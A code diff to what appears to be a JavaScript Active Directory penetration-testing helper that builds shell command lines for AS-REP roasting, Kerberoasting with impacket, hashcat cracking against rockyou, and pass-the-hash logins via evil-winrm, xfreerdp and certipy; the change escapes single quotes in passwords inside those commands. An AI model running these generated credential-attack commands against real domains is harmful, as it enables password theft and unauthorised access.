@@ -561,7 +561,7 @@
         cmd: 'hashcat -m 18200 ' + low + '.asrep /usr/share/wordlists/rockyou.txt' });
     }
     if (p.kerberoastable) {
-      var auth = (you ? (domain + '/' + you) : (domain + '/<youruser>')) + ":'<password>'";
+      var auth = (you ? (domain + '/' + you) : (domain + '/<youruser>')) + ":'" + (ctx.pw ? String(ctx.pw).replace(/'/g, "'\\''") : '<password>') + "'";
       out.push({ why: 'Has an SPN: Kerberoast (needs any one valid domain credential).',
         cmd: 'impacket-GetUserSPNs ' + auth + ' -request-user ' + tgt + ' -dc-ip ' + dc });
       out.push({ why: 'Crack the TGS hash offline.',
@@ -774,13 +774,13 @@
     var pw = ctx.pw || '', nt = ctx.nt || '';
     // Per-tool auth built from the RAW secret, so a hash-only identity gets pass-the-hash flags instead
     // of a blank password: impacket -hashes, evil-winrm -H, xfreerdp /pth, certipy -hashes.
-    var imp = pw ? ("'" + domain + '/' + u + ':' + pw + "'@" + dc)
+    var imp = pw ? ("'" + domain + '/' + u + ':' + String(pw).replace(/'/g, "'\\''") + "'@" + dc)
       : nt ? ("'" + domain + '/' + u + "'@" + dc + ' -hashes :' + nt)
       : ("'" + domain + '/' + u + "'@" + dc);
-    var winrmAuth = pw ? ("-p '" + pw + "'") : nt ? ('-H ' + nt) : "-p ''";
-    var rdpAuth = pw ? ("/p:'" + pw + "'") : nt ? ('/pth:' + nt) : "/p:''";
-    var printerAuth = pw ? (domain + '/' + u + ":'" + pw + "'@<HOST>") : nt ? ('-hashes :' + nt + ' ' + domain + '/' + u + '@<HOST>') : (domain + '/' + u + ":''@<HOST>");
-    var certAuth = pw ? ("-p '" + pw + "'") : nt ? ('-hashes :' + nt) : '';
+    var winrmAuth = pw ? ("-p '" + String(pw).replace(/'/g, "'\\''") + "'") : nt ? ('-H ' + nt) : "-p ''";
+    var rdpAuth = pw ? ("/p:'" + String(pw).replace(/'/g, "'\\''") + "'") : nt ? ('/pth:' + nt) : "/p:''";
+    var printerAuth = pw ? (domain + '/' + u + ":'" + String(pw).replace(/'/g, "'\\''") + "'@<HOST>") : nt ? ('-hashes :' + nt + ' ' + domain + '/' + u + '@<HOST>') : (domain + '/' + u + ":''@<HOST>");
+    var certAuth = pw ? ("-p '" + String(pw).replace(/'/g, "'\\''") + "'") : nt ? ('-hashes :' + nt) : '';
     var recipes = {
       asrep: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --asreproast asrep.hashes',
               'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt'],
